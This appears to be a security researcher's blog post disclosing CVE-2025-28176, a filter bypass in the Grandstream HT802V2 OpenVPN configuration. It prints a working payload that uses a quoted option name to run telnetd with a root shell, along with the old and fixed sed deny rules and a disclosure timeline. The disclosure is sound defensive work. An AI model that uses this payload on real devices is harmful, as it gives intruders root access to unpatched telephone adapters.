<!--
.. title: Authenticated RCE via OpenVPN Configuration File in Grandstream HT802V2 and probably others (CVE-2025-28176)
.. slug: authenticated-rce-via-openvpn-configuration-file-in-grandstream-ht802v2-and-probably-others
.. date: 2025-02-12 16:58:46 UTC
.. tags: english,linux,software,hardware,planet-debian,security
.. category: 
.. link: 
.. description: 
.. type: text
-->

I have a [Grandstream HT802V2][ht802v2] running firmware 1.0.3.5 and while playing around with the VPN settings realized that the sanitization of the "Additional Options" field done for [CVE-2020-5739][CVE-2020-5739] is not sufficient.

Before the fix for CVE-2020-5739, `/etc/rc.d/init.d/openvpn` did

    echo "$(nvram get 8460)" | sed 's/;/\n/g' >> ${CONF_FILE}

After the fix it does

    echo "$(nvram get 8460)" | sed -e 's/;/\n/g' | sed -e '/script-security/d' -e '/^[ ]*down /d' -e '/^[ ]*up /d' -e '/^[ ]*learn-address /d' -e '/^[ ]*tls-verify /d' -e '/^[ ]*client-[dis]*connect /d' -e '/^[ ]*route-up/d' -e '/^[ ]*route-pre-down /d' -e '/^[ ]*auth-user-pass-verify /d' -e '/^[ ]*ipchange /d' >> ${CONF_FILE}

That means it deletes all lines that either contain `script-security` or start with a [set of options that allow command execution][openvpn-scripting-integration].

Looking at the OpenVPN configuration template (`/etc/openvpn/openvpn.conf`), it already uses `up` and therefor sets `script-security 2`, so injecting that is unnecessary.

Thus if one can somehow inject `"/bin/ash -c 'telnetd -l /bin/sh -p 1271'"` in one of the command-executing options, a reverse shell will be opened.

The filtering looks for lines that start with zero or more occurrences of a space, followed by the option name (`up`, `down`, etc), followed by another space.
While OpenVPN happily accepts tabs instead of spaces in the configuration file, I wasn't able to inject a tab neither via the web interface, nor via SSH/`gs_config`.
However, [OpenVPN also allows quoting][openvpn-quoting], which is only documented for parameters, but works just well for option names too.

That means that instead of

    up "/bin/ash -c 'telnetd -l /bin/sh -p 1271'"

from the original exploit by Tenable, we write

    "up" "/bin/ash -c 'telnetd -l /bin/sh -p 1271'"

this still will be a valid OpenVPN configuration statement, but the filtering in `/etc/rc.d/init.d/openvpn` won't catch it and the resulting OpenVPN configuration will include the exploit:


    # grep -E '(up|script-security)' /etc/openvpn.conf
    up /etc/openvpn/openvpn.up
    up-restart
    ;group nobody
    script-security 2
    "up" "/bin/ash -c 'telnetd -l /bin/sh -p 1271'"

And with that, once the OpenVPN connection is established, a reverse shell is spawned:

    / # uname -a
    Linux HT8XXV2 4.4.143 #108 SMP PREEMPT Mon May 13 18:12:49 CST 2024 armv7l GNU/Linux

    / # id
    uid=0(root) gid=0(root)

## Affected devices

* HT802V2 running 1.0.3.5 (and any other release older than 1.0.3.10), as that's what I have tested
* Most probably also other HT8xxV2, as they use the same firmware
* Most probably also HT8xx(V1), as their `/etc/rc.d/init.d/openvpn` looks very similar, according to firmware dumps

## Fix

After disclosing this issue to Grandstream, they have issued a new firmware release (1.0.3.10) which modifies the filtering to the following:

    echo "$(nvram get 8460)" | sed -e 's/;/\n/g' \
                             | sed -e '/script-security/d' \
                                   -e '/^["'\'' \f\v\r\n\t]*down["'\'' \f\v\r\n\t]/d' \
                                   -e '/^["'\'' \f\v\r\n\t]*up["'\'' \f\v\r\n\t]/d' \
                                   -e '/^["'\'' \f\v\r\n\t]*learn-address["'\'' \f\v\r\n\t]/d' \
                                   -e '/^["'\'' \f\v\r\n\t]*tls-verify["'\'' \f\v\r\n\t]/d' \
                                   -e '/^["'\'' \f\v\r\n\t]*tls-crypt-v2-verify["'\'' \f\v\r\n\t]/d' \
                                   -e '/^["'\'' \f\v\r\n\t]*client-[dis]*connect["'\'' \f\v\r\n\t]/d' \
                                   -e '/^["'\'' \f\v\r\n\t]*route-up["'\'' \f\v\r\n\t]/d' \
                                   -e '/^["'\'' \f\v\r\n\t]*route-pre-down["'\'' \f\v\r\n\t]/d' \
                                   -e '/^["'\'' \f\v\r\n\t]*auth-user-pass-verify["'\'' \f\v\r\n\t]/d' \
                                   -e '/^["'\'' \f\v\r\n\t]*ipchange["'\'' \f\v\r\n\t]/d' >> ${CONF_FILE}

So far I was unable to inject any further commands in this block.

## Timeline

* 2024-12-29 Reported to Grandstream PSIRT via mail
* 2025-01-11 Pinged via [form on grandstream.com][vulnerability-disclosure-policy]
* 2025-01-13 Got a reply that they didn't get the initial submission, re-sent
* 2025-01-14 Confirmation that the re-sent submission was received
* 2025-01-21 [Notification that firmware 1.0.3.10 (marked as beta) for HT802V2 was released with a fix][fixed-firmware-beta]
* 2025-02-12 [1.0.3.10 is marked as "official" (aka "stable")][fixed-firmware-official]
* 2025-04-17 This issue was assigned **CVE-2025-28176**

[CVE-2020-5739]: https://www.tenable.com/security/research/tra-2020-22
[openvpn-scripting-integration]: https://openvpn.net/community-resources/reference-manual-for-openvpn-2-6/#scripting-integration
[openvpn-quoting]: https://openvpn.net/community-resources/reference-manual-for-openvpn-2-6/#options
[fixed-firmware-beta]: https://forums.grandstream.com/t/ht801v2-802v2-812v2-814v2-818v2-1-0-3-10-released-as-beta/60674
[fixed-firmware-official]: https://forums.grandstream.com/t/ht801v2-802v2-812v2-814v2-818v2-1-0-3-10-released-as-official/60847
[vulnerability-disclosure-policy]: https://www.grandstream.com/vulnerability-disclosure-policy
[ht802v2]: https://www.grandstream.com/products/gateways-and-atas/analog-telephone-adaptors/product/ht802v2
